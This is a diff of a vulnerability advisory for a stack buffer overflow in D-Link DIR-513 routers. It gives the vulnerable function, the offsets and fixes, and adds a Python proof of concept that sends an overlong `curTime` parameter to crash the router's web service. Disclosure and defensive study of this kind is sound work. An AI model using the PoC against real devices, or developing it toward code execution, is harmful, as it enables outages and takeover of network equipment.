@@ -1,55 +1,82 @@
-**Vulnerability Title:** Stack-based Buffer Overflow in D-Link DIR-513 `formSetWAN_Wizard52` function
+## Vulnerability Report: D-Link DIR-513 Buffer Overflow
 
-**Vulnerability Description:**
+**Vulnerability Type:** Stack-based Buffer Overflow (CWE-121)
 
-A critical stack-based buffer overflow vulnerability exists in the Web management interface of D-Link DIR-513 routers (A1 FW110, A2 FW110). The flaw is located within the `formSetWAN_Wizard52` function at memory address `0x44a940`.
+**Vendor:** D-Link
 
-The vulnerability is triggered when the application processes an HTTP POST request containing a specially crafted, overlong `curTime` parameter. The program retrieves this parameter via `websGetVar` and subsequently utilizes the unsafe `sprintf` function (at `0x44ac84`) to format the input into a fixed-size stack buffer `v30` (200 bytes) located at `SP + 0xE0`.
+**Vendor Website:**
 
-Because the function lacks any boundary or length validation for the `curTime` input, an attacker can provide a payload that overflows the buffer and overwrites the saved return address (RA) at `SP + 0x1C8`. This allows a remote attacker to hijack the program's control flow, leading to a Denial of Service (DoS) or arbitrary Remote Code Execution (RCE) with elevated privileges.
+**Affected Object Type:** Network Equipment (Switches, Routers, etc.)
 
----
+**Affected Product:** DIR-513
 
-### Technical Details
+**Affected Versions:** A1 FW110, A2 FW110
 
-- **Vulnerability Type:** CWE-121 (Stack-based Buffer Overflow)
+**Component Vulnerability:** No
 
-- **Affected Component:** `goform/formSetWAN_Wizard52`
+**Vulnerability Name:** D-Link DIR-513 `formSetWAN_Wizard52` Function Buffer Overflow (Binary Vulnerability)
 
-- **Attack Vector:** Network (Remote via HTTP POST)
+**Version:** 1.10
 
-- **Impact:** Remote Code Execution (RCE) / Denial of Service (DoS)
+### Vulnerability Description
 
-- **Authentication:** Not required (depending on specific device deployment)
+D-Link DIR-513 is a network router manufactured by D-Link. A stack-based buffer overflow vulnerability exists in the Web service of the D-Link DIR-513 when processing form requests.
 
-#### Stack Frame & Offset Analysis:
-
-- **Buffer `v30` Start:** `SP + 0xE0`
-
-- **Return Address (RA) Position:** `SP + 0x1C8`
-
-- **Calculated Offset to RA:** $0x1C8 - 0xE0 = 232$ bytes
-
-- **Vulnerable Instruction:** `sprintf(v30, "/Basic/Wizard_WAN_complete.asp?t=%s", v3);`
+Within the `formSetWAN_Wizard52` function, the program retrieves the user-controllable `curTime` parameter via `websGetVar` without any length validation. The program then calls the unbounded `sprintf` function to concatenate the oversized `curTime` string into a fixed-size (200 bytes) stack buffer `v30`. An attacker can send a specially crafted HTTP POST request to trigger a stack overflow, overwriting the return address (located 232 bytes away from the buffer start). This can lead to a Denial of Service (DoS) or Remote Code Execution (RCE).
 
 ---
 
-### Proof of Concept (PoC) Sketch
+### Trigger Point
 
-The vulnerability can be reached by sending a POST request where the `curTime` parameter, when combined with the 35-byte static prefix `"/Basic/Wizard_WAN_complete.asp?t="`, exceeds 232 bytes in length to reach and overwrite the Return Address.
+The vulnerability is located in the `formSetWAN_Wizard52` function (Address: `0x44a940`) of the network service program, specifically at the following statement: `sprintf(v30, "/Basic/Wizard_WAN_complete.asp?t=%s", v3);` (Address: `0x44ac84`)
+
+**Trigger Condition:** The vulnerability is triggered when an HTTP POST request is sent to the `/formSetWAN_Wizard52` endpoint containing an excessively long `curTime` parameter.
 
 ---
 
-### Mitigation and Fix
+### Proof of Concept (PoC)
 
-**Official Fix:**
+```
+import requests
 
-The vendor should replace the unsafe `sprintf` call with `snprintf` to ensure the data written does not exceed the buffer size:
+TARGET_IP = "192.168.0.1"
+url = f"http://{TARGET_IP}/goform/formSetWAN_Wizard52"
 
-`snprintf(v30, sizeof(v30), "/Basic/Wizard_WAN_complete.asp?t=%s", v3);`
+# 计算偏移量
+PREFIX_LENGTH = len("/Basic/Wizard_WAN_complete.asp?t=")  # 35 字节
+BUFFER_SIZE = 200
+OFFSET_TO_RA = 232
 
-**Temporary Mitigation:**
+# 构造 payload
+padding = b'A' * (OFFSET_TO_RA - PREFIX_LENGTH + 10)
 
-- Implement input length validation for the `curTime` parameter at the Web Server entry point (e.g., limit to 64 bytes).
+payload = padding 
 
-- Enable compiler-level protections such as Stack Canaries (`-fstack-protector-all`) and NX (No-Execute) bits.
+data = {
+    "curTime": payload,
+    "config.wan_ip_address": "192.168.0.100"
+}
+
+
+try:
+    response = requests.post(url, data=data, timeout=5)
+    print(f"Response Status: {response.status_code}")
+except requests.exceptions.RequestException as e:
+    print(f"Request failed (Possible crash): {e}")
+```
+
+
+
+---
+
+### Solutions
+
+#### Temporary Mitigation:
+
+1. **Input Validation:** Implement length validation for the `curTime` parameter, restricting it to a reasonable limit (e.g., maximum 64 bytes) and rejecting any requests that exceed this limit.
+
+2. **Access Control:** Restrict access to the Web management interface to trusted internal IP addresses only to reduce the attack surface for remote attackers.
+
+#### Official Fix:
+
+Replace the high-risk `sprintf` function with a safe, bounds-checked alternative: `snprintf(v30, sizeof(v30), "/Basic/Wizard_WAN_complete.asp?t=%s", v3);`
